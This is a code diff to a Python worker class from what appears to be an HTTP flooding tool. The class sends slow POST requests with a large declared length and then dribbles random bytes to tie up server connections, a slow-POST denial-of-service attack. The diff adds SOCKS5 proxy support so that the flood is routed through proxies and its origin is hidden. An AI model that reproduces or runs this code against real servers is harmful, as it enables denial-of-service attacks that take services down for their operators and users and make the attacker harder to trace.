@@ -1,19 +1,18 @@
-import socket, time
+import socks, time
 from Functions import *
 from multiprocessing import Process
-
-# Thanks to _entropy
 
 class HTTPWorkerThread(Process):
 
     def __init__(self, flooder, id):
         Process.__init__(self)
         self.id = id
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
-        self.socket.setblocking(1)
+        self.socket = socks.socksocket()
 
         self.host = flooder.host
         self.port = flooder.port
+        self.socks5ip = flooder.socks5ip
+        self.socks5port = flooder.socks5port
         self.running = True
 
         self.useragents = {1 : 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
@@ -47,7 +46,7 @@ class HTTPWorkerThread(Process):
                           "Content-Length: 10000\r\n"
                           "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                           (self.host, self.useragents[random.randrange(1,12)]))
-        #print "thread", self.id, "send header"
+        #print "thread", self.id, "send post"
         
         for i in range(0, 9999):
             self.socket.send(randomString(1))
@@ -55,11 +54,27 @@ class HTTPWorkerThread(Process):
 
         self.socket.close()
 
+    def checkProxyAlive(self):
+        proxyalive = True
+        s = socks.socksocket()
+        #print "testing proxy connection %s:%d" % (self.socks5ip, self.socks5port)
+        try:
+            s.connect((self.socks5ip, self.socks5port))
+        except Exception, e:
+            #print "thread", self.id, "Proxy seems down %s:%d" % (self.socks5ip, self.socks5port)
+            proxyalive = False
+        s.close()
+        return proxyalive
+
     def run(self):
         try:
             while self.running:
                 while self.running:
                     try:
+                        if self.socks5ip is not None and self.socks5port is not None:
+                            if self.checkProxyAlive():
+                                #print "thread", self.id, "using socks5 proxy %s %d" % (self.socks5ip, self.socks5port)
+                                self.socket.setproxy(socks.PROXY_TYPE_SOCKS5, self.socks5ip, self.socks5port)
                         self.socket.connect((self.host, self.port))
                         #print "thread", self.id, "connected"
                         break
@@ -76,7 +91,7 @@ class HTTPWorkerThread(Process):
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
                         #print "thread", self.id ,"connection broken, retrying."
-                        self.socket = socket.socket()
+                        self.socket = socks.socksocket()
                     #print "Couldn't send message on thread", self.id, "because", e.args
                     time.sleep(0.1)
                     pass
@@ -90,5 +105,4 @@ class HTTPWorkerThread(Process):
 
     def __setstate__(self, dict):
         self.__dict__.update(dict)
-        self.socket = socket.socket()
-        self.socket.setblocking(1)
+        self.socket = socks.socksocket()
